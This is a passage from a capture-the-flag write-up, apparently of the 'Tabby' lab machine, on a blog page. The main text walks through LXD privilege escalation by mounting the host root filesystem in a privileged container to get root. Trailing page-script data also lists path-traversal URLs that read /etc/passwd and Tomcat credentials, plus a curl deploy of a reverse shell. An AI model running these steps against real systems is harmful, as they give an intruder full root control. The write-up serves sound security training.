LXD is a root process that performs activities for anybody with write access to the LXD UNIX socket, and it frequently ignores the calling user's rights.\n\nWe'll need the alpine-builder package to take use of this. I used git clone to obtain the package: git clone https:\u002F\u002Fgithub.com\u002Fsaghul\u002Flxd-alpine-builder.git and then transferred it to the tabby host using a python web server hosted on my kali machine. I was able to transfer it using curl -O from there. We needed to build it using the following commands after we had the alpine package on the host:\n\n````\ncd lxd-alpine-builder\nsudo .\u002Fbuild-alpine\n````\n\nFrom there, I needed to configure LXD, so I started the LXD initialization process with the \"lxd init\" comman. After the image has been built it can be added as an image to LXD as follows:\n\n```\nlxc image import .\u002Fapline-v3.10-x86_64-20191008_1227.tar.gz --alias hotshoto\n```\n\nNow that I have created a new lxd container, as a final step I needed to give the container security privileges and then set its mount path as \"\u002Fmnt\" using the following commands:\n\n```\nlxc init newalpine hotshoto -c security.privileged=true\nlxc config device add hotshoto container disk source=\u002F path=\u002Fmnt\u002Froot recursive=true\n```\n\nWith everything configured, I could start the new image using the following commands:\n\n```\nlxc start hotshoto\nlxc exec hotshoto \u002Fbin\u002Fsh\n```\n\n```\nash@tabby: lxc exec hoc hotshoto \u002Fbin\u002Fsh\n# Whoami\nroot \n# echo \" \"; echo \"uname -a:\";uname -a;echo \" \";echo \"hostname:\";hostname;echo \"\";echo \"id\";echo; \" \";echo \"ifconfig:\";\u002Fsbin\u002Fifconfig -a; echo \" \";echo \"groups:\";groups;\n\nuname -a:\nLinux hotshoto 5.4.0.31-generic #35-Ubuntu SMP Thu Jan 11 20:20:34 UTCH 2022 x86_64 Linux\n\nhostname:\nhotshoto\n\nid\nuid=0(root) gid=0(root)\n\nifconfig:\neth0\t\tLink encap:Ethernet   HWaddr 00:16:3E:F4:23:06\n\t\t\tinet addr:10.52.139.131  Bcast:10.52.139.255  Mask:255.255.255.0\n\t\t\tinet6 addr: fd42:b312:e739:9016:216:3eff:fef4:2306\u002F64 Scope:\n```\n\n\n\nAfter running the bash file, we see that we have a different shell which is the shell of the container. This container has all the files of the host machine and in order to browse the root object, we simply needed to navigate to \"\u002Fmnt\u002Froot\" to see all resources from the host machine. That’s the box! I\n";J.readingTime="8 min read";J.twitterShareUrl="https:\u002F\u002Ftwitter.com\u002Fintent\u002Ftweet";return {data:[{project:J,_img:al}],fetch:{"data-v-312258fc:0":{toastOptions:{duration:2000,theme:"bubble"},currentlyActiveToc:"",observer:am,observerOptions:{root:void 0,threshold:0},project:J,_img:al}},mutations:[["setItem",{item:am,id:D,resource:an}],["pushItem",{item:{text:"Test 😁👋🏼",photoURL:"https:\u002F\u002Flh3.googleusercontent.com\u002Fa-\u002FAOh14GhjY9O4_0Pit37hyyr9WwCUxwF2FUAvJay7_olXNA=s96-c",updated:new Date(1642115045000),created:new Date(1642115045000),name:K,slug:D,authorUID:"o3Hp4A6gTkTkOOIYA93rkoJ2Eet2"},id:D,resource:an}]]}}("text","element","\n","p","code","a","_blank","td","div","nuxt-content-highlight","pre","language-text","line-numbers","nofollow","noopener","noreferrer","true",-1,"span","icon","icon-link","nuxt-link","some","\n  ","img","80%","webpage",3,"h3","minor_own-a-linux-machine","zip2john","tr","th","Own a Linux machine","open",{},"Rik Peeters","create-reverse-shell","Create Reverse Shell","upload-reverse-shell","Upload Reverse Shell","start-netcat-listener","Start Netcat Listener","john","John","h1","\u002Fimages\u002Fprojects\u002Fminor\u002Fnmap.png","http","\u002Fimages\u002Fprojects\u002Fminor\u002Fwebpage.png","http:\u002F\u002Fmegahosting.htb\u002Fnews.php?file=statement","http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002Fetc\u002Fpasswd","\u002Fimages\u002Fprojects\u002Fminor\u002Floaded-page.webp","\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-page.webp","view-source: ","http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml","http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002F..\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml","\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-password.png","\u002Fimages\u002Fprojects\u002Fminor\u002Fhost-manager.png","curl","http:\u002F\u002F10.10.10.194:8080\u002Fmanager\u002Ftext\u002Fdeploy?path=\u002Fmy_reverse_shell","\u002Fimages\u002Fprojects\u002Fminor\u002Freverse-shell.png","li","https:\u002F\u002Fethicalhackingguru.com\u002Fthe-lxd-privilege-escalation-tutorial-how-to-exploit-lxd\u002F","https:\u002F\u002Fwww.hackingarticles.in\u002Flxd-privilege-escalation\u002F","https:\u002F\u002Fgithub.com\u002Fsaghul\u002Flxd-alpine-builder.git",{},null,"comments")));